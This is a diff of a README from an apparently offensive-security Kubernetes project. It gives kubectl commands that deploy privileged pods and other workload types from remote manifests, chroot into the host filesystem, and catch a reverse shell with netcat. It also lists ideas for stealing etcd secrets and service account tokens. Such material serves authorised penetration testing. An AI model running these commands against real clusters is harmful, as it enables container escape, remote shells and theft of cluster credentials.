@@ -4,20 +4,71 @@ The pod you create mounts the host’s filesystem to the pod. You’ll have the 
 * **Read secrets from etcd** – If you can run your pod on a control-plane node using the nodeName selector in the pod spec, you might have easy access to the etcd database, which contains all of the configuration for the cluster, including all secrets. 
 * **Hunt for privileged service account tokens**  - Even if you can only schedule your pod on the worker node, you can also access any secret mounted within any pod on the node you are on.  In a production cluster, even on a worker node, there is usually at least one pod that has a token mounted that is bound to a service account that is bound to a clusterrolebinding, that gives you access to do things like create pods or view secrets in all namespaces. 
 
+Table of Contents
+* [Pod Creation & Access](#Pod-Creation-&-Access)
+   * [Create one or more of these resource types and exec into the pod](#Create-one-or-more-of-these-resource-types-and-exec-into-the-pod)
+   * [Create one or more of these resources and catch reverse shell](#Create-one-or-more-of-these-resources-and-catch-reverse-shell)
+   * [Deleting Resources](#Deleting-Resources)
+* [Post exploitation](#Post-exploitation)
+   * [Look for kubeconfig's in the host filesystem](#Look-for-kubeconfig's-in-the-host-filesystem) 
+   * [Grab all tokens from all pods on the system](#Grab-all-tokens-from-all-pods-on-the-system)
+   * [Some other ideas](#Some-other-ideas)
+   * [Attacks that apply to all pods, even without any special permissions](#Attacks-that-apply-to-all-pods-even-without-any-special-permissions)
 
-# Pod Creation
 
-## Create a pod you can exec into
-Create pod
+# Pod Creation & Access
+
+## Create one or more of these resource types and exec into the pod
+**Pod**  
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/everything-exec-pod-allowed.yaml 
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
+kubectl exec -it everything-allowed-exec-pod -- chroot /host bash
 ```
-Exec into pod 
+**Job**  
 ```bash
-kubectl exec -it everything-exec-pod-allowed -- chroot /host
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/job/everything-allowed-exec-job.yaml 
+kubectl get pods | grep everything-allowed-exec-job      
+kubectl exec -it everything-allowed-exec-job-[ID] -- chroot /host bash
+```
+**CronJob**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/cronjob/everything-allowed-exec-cronjob.yaml 
+kubectl get pods | grep everything-allowed-exec-cronjob      
+kubectl exec -it everything-allowed-exec-cronjob-ID -- chroot /host bash
+```
+**Deployment**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/deployment/everything-allowed-exec-deployment.yaml 
+kubectl get pods | grep everything-allowed-exec-deployment        
+kubectl exec -it everything-allowed-exec-deployment-[ID] -- chroot /host bash
+```
+**StatefulSet (This manifest also creates a service)**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/statefulset/everything-allowed-exec-statefulset.yaml
+kubectl get pods | grep everything-allowed-exec-statefulset
+kubectl exec -it everything-allowed-exec-statefulset-[ID] -- chroot /host bash
+```
+**ReplicaSet**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicaset/everything-allowed-exec-replicaset.yaml
+kubectl get pods | grep everything-allowed-exec-replicaset
+kubectl exec -it everything-allowed-exec-replicaset-[ID] -- chroot /host bash
+
+```
+**ReplicationController**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/replicationcontroller/everything-allowed-exec-replicationcontroller.yaml
+kubectl get pods | grep everything-allowed-exec-replicationcontroller
+kubectl exec -it everything-allowed-exec-replicationcontroller-[ID] -- chroot /host bash
+```
+**DaemonSet**  
+```bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/deamonset/everything-allowed-exec-daemonset.yaml 
+kubectl get pods | grep everything-allowed-exec-daemonset
+kubectl exec -it everything-allowed-exec-daemonset-[ID] -- chroot /host bash
 ```
 
-## Reverse shell pod
+## Create one or more of these resources and catch reverse shell
 
 Set up listener
 ```bash
@@ -35,6 +86,16 @@ $ nc -nvlp 3116
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
 # chroot /host
+```
+
+## Deleting Resources
+You can delete a resource using it's manifest, or by name: 
+```
+kubectl delete [type] [resourcename]
+kubectl delete -f manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
+kubectl delete -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
+kubectl delete pod everything-allowed-exec-pod
+kubectl delete cronjob everything-allowed-exec-cronjob
 ```
 
 # Post exploitation
